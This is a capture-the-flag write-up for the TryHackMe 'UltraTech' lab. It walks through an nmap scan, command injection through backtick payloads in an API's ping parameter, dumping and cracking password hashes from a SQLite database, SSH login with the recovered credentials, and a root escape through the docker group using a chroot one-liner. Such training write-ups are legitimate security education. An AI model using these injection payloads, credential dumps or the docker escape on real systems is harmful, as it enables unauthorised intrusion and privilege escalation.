This is medium level challenge in TryHackMe

Going with the NMAP scan as usual
```diff
nmap 10.10.13.195 -T4 -A -p- -sV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-19 10:07 EDT
Stats: 0:13:19 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 83.40% done; ETC: 10:23 (0:02:39 remaining)
Stats: 0:13:19 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 83.41% done; ETC: 10:23 (0:02:38 remaining)
Stats: 0:13:19 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 83.44% done; ETC: 10:23 (0:02:38 remaining)
Stats: 0:13:20 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 83.51% done; ETC: 10:23 (0:02:38 remaining)                                                                                  
Nmap scan report for 10.10.13.195                                                                                                                           
Host is up (0.20s latency).                                                                                                                                 
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp  open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=8/19%OT=21%CT=1%CU=35736%PV=Y%DS=5%DC=T%G=Y%TM=66C3
OS:559C%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=108%TI=Z%II=I%TS=A)SEQ(S
OS:P=105%GCD=1%ISR=10B%TI=Z%CI=I%TS=A)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=I%II
OS:=I%TS=A)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=RD%TS=A)OPS(O1=M508ST11NW6%O2=M
OS:508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN
OS:(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=690
OS:3%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(
OS:R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z
OS:%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y
OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RI
OS:PL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 5 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   32.42 ms  10.17.0.1
2   ... 4
5   274.04 ms 10.10.13.195
```

Ports 21, 8081 and 31331 are the ports that look interesting. Port 21 has an FTP server running, but it does not allow anonymous login. So, it let's look further into the other ports before coming back. 

Port 31331 has the following 
![alt text](/assets/image9.png)

Navigating to /robots.txt we can see that "/utech_sitemap.txt" is disallowed. Now navigating to "/utech_sitemap.txt". Here we have 

```diff
/
/index.html
/what.html
/partners.html
```
/partners.html is a new endpoint, which I could'nt previously find.

Navigating to partners.html, it is a login form asking for a username and password. I saw this api.js file while inspecting this page. 
![alt text](/assets/image10.png)

Now navigating to api.js
```diff
(function() {
    console.warn('Debugging ::');

    function getAPIURL() {
	return `${window.location.hostname}:8081`
    }
    
    function checkAPIStatus() {
	const req = new XMLHttpRequest();
	try {
	    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
	    req.open('GET', url, true);
	    req.onload = function (e) {
		if (req.readyState === 4) {
		    if (req.status === 200) {
			console.log('The api seems to be running')
		    } else {
			console.error(req.statusText);
		    }
		}
	    };
	    req.onerror = function (e) {
		console.error(xhr.statusText);
	    };
	    req.send(null);
	}
	catch (e) {
	    console.error(e)
	    console.log('API Error');
	}
    }
    checkAPIStatus()
    const interval = setInterval(checkAPIStatus, 10000);
    const form = document.querySelector('form')
    form.action = `http://${getAPIURL()}/auth`;
    
})();
```

Port 8081 endpoint seems to be an API endpoint, with majorly two functionality, ping and authetication. This ping helps in identifying if the API endpoint is active or not. Now looking deeper into this ping functionality there seems to be a problem. The IP parameter seems to be manipulable. So, theoretically the backend should look something like.

```diff
ping <ip_passed_by_IP_param>
```

So with this idea in mind, I tried to perform command injection attacks. Tried several payloads like
```diff
127.0.0.1; ls
127.0.0.1 & ls
```
These did not seem to work. Finally, the following payload 

```diff
`ls`

ping: utech.db.sqlite: Name or service not known 
```

"utech.db.sqlite" is leaked, hence verifying the execution of ls. Now let's cat out the contents of this db.
```diff
ping: ) ���(M r00tf357a0c52799563c7c7b76c1e7543a32) M admin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded 
```
Dehashing the password. r00t:n100906,admin:mrsheafy. Using any of these we can login to the page.

![alt text](/assets/image11.png)

Now lets try to ssh into the given IP using r00t creds.
```diff
ssh r00t@10.10.16.170 
The authenticity of host '10.10.16.170 (10.10.16.170)' can't be established.
ED25519 key fingerprint is SHA256:g5I2Aq/2um35QmYfRxNGnjl3zf9FNXKPpEHxMLlWXMU.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:28: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.16.170' (ED25519) to the list of known hosts.
r00t@10.10.16.170's password: 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Aug 21 16:43:22 UTC 2024

  System load:  0.0                Processes:           102
  Usage of /:   24.3% of 19.56GB   Users logged in:     0
  Memory usage: 69%                IP address for eth0: 10.10.16.170
  Swap usage:   0%

 * Ubuntu's Kubernetes 1.14 distributions can bypass Docker and use containerd
   directly, see https://bit.ly/ubuntu-containerd or try it now with

     snap install microk8s --channel=1.14/beta --classic

1 package can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

r00t@ultratech-prod:~$ 
```

Nicee!! Now there are no flags for this challenge so, let's move on to privelege escalation. Note in the above output, when we ssh into the IP we can see "Ubuntu's Kubernetes 1.14 distributions can bypass Docker and use containerd" indicating that the instance is running as a docker image. 

```diff
r00t@ultratech-prod:~$ docker images

REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
bash                latest              495d6437fc1e        5 years ago         15.8MB

```

Now we can break out of the docker instance as root by doing the following

```diff
r00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
$# whoami
root
```

That's it. Peace.